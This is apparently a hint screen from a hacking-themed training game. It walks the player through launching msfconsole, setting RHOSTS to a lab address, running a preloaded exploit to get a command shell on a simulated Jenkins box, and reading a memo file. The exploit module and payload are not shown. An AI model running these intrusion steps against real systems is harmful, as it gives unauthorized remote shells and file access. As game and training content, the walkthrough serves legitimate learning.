HINT -- phase 3 (msfconsole)
══════════════════════════════════════════════════════════════════

THE FOUR COMMANDS
─────────────────
Module and callback are preloaded. Type these in order, one at
a time:

    msfconsole
    set RHOSTS 10.4.12.1
    exploit
    cat /mnt/exec/ic-memo.txt

WHAT YOU'LL SEE
───────────────
After `exploit` you'll see "Command shell session 1 opened" and
the prompt goes blank. You're on the Jenkins box.

After `cat /mnt/exec/ic-memo.txt`, the payoff sequence plays.
Press Enter through three screens (the memo, the analysis, the
debrief). The game advances automatically -- no flag to type.

When it lets you out, you're back at the m0usenet prompt. Type
`continue` to leave and report to HQ.
